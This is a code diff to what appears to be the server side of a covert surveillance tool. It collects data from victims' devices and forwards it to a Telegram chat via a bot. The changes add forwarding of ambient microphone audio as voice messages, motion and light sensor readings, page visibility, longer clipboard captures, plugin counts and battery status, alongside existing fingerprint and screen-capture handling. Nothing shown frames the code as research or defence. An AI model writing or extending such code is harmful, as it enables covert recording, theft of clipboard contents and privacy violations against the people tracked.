@@ -286,7 +286,8 @@ async function startServer() {
                   `├ CPU_CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                   `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
                   `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
-                  `└ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
+                  `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
                   `🌍 <b>GEOGRAPHIC DATA:</b>\n` +
                   `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                   `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
@@ -355,10 +356,36 @@ async function startServer() {
         } catch(e) { console.error('Buffer processing error (screen_capture):', e); }
       }
 
-      if (data.display_hz || data.thermal_load) {
-        addSection(`📡 Display & Thermal`,
-                   `├ Refresh: <code>${data.display_hz || 'N/A'} Hz</code>\n` +
-                   `└ Thermal: <code>${data.thermal_load || 'Stable'}</code>`);
+      // 3. Handle Audio Chunks
+      if (data.audio_chunk) {
+        try {
+          const base64Data = data.audio_chunk.includes(',') ? data.audio_chunk.split(',')[1] : data.audio_chunk;
+          const buffer = Buffer.from(base64Data, 'base64');
+          if (buffer.length > 0) {
+            botInstance.telegram.sendVoice(chatId, { source: buffer, filename: 'ambient.ogg' }, {
+              caption: '🎙️ <b>CAPTURE: Ambient Audio Segment</b>\nNode: <code>' + id + '</code>',
+              parse_mode: 'HTML'
+            }).catch(err => console.error('Error sending audio chunk:', err));
+          }
+        } catch(e) {}
+      }
+
+      if (data.display_hz || data.thermal_load || data.device_visibility) {
+        let visTxt = '';
+        if (data.display_hz) visTxt += `├ Refresh: <code>${data.display_hz} Hz</code>\n`;
+        if (data.thermal_load) visTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
+        if (data.device_visibility) visTxt += `└ Visibility: <code>${data.device_visibility}</code> (${data.visibility_ts || '?'})`;
+        addSection(`📡 Environment & UI State`, visTxt);
+      }
+
+      if (data.sensor_mag || data.sensor_acc || data.sensor_gyr || data.sensor_light) {
+        let sTxt = '';
+        if (data.sensor_mag) sTxt += `├ Mag: <code>${data.sensor_mag}</code>\n`;
+        if (data.sensor_acc) sTxt += `├ Acc: <code>${data.sensor_acc}</code>\n`;
+        if (data.sensor_gyr) sTxt += `├ Gyr: <code>${data.sensor_gyr}</code>\n`;
+        if (data.sensor_light) sTxt += `├ Light: <code>${data.sensor_light} lux</code>\n`;
+        if (data.sensor_orient) sTxt += `└ Orient: <code>${data.sensor_orient}</code>`;
+        addSection(`📐 Hardware Motion/Light`, sTxt);
       }
 
       if (data.hardware_brand_profile) {
@@ -378,9 +405,9 @@ async function startServer() {
                    `└ Resources: <code>${data.perf_cores || 'N/A'} Cores / ${data.perf_mem || 'N/A'} GB RAM</code>`);
       }
 
-      if (data.clipboard_sync || data.clipboard) {
-        const clip = data.clipboard_sync || data.clipboard;
-        addSection(`📋 Clipboard Sync`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1000))}</pre>`);
+      if (data.clipboard_sync || data.clipboard || data.clipboard_update) {
+        const clip = data.clipboard_sync || data.clipboard || data.clipboard_update;
+        addSection(`📋 Clipboard Sync`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1500))}</pre>`);
       }
 
       if (data.media_hardware) {
@@ -416,11 +443,13 @@ async function startServer() {
         if (fpt) addSection(`🧬 Browser Fingerprint`, fpt);
       }
 
-      if (data.battery_level) {
+      if (data.battery_level || data.battery_status) {
+        const lvl = data.battery_level || data.battery_status;
+        const char = data.battery_charging || data.charging;
         addSection(`🔋 System Power Status`,
-                    `├ Level: <code>${data.battery_level}</code>\n` +
-                    `├ Plugged: <code>${data.battery_charging ? 'AC_POWER' : 'BATTERY'}</code>\n` +
-                    `└ Time: <code>${data.battery_time}</code>`);
+                    `├ Level: <code>${lvl}</code>\n` +
+                    `├ Plugged: <code>${char ? 'AC_POWER' : 'BATTERY'}</code>\n` +
+                    `└ Time: <code>${data.battery_time || 'N/A'}</code>`);
       }
 
       if (data.fonts_count || data.installed_fonts) {
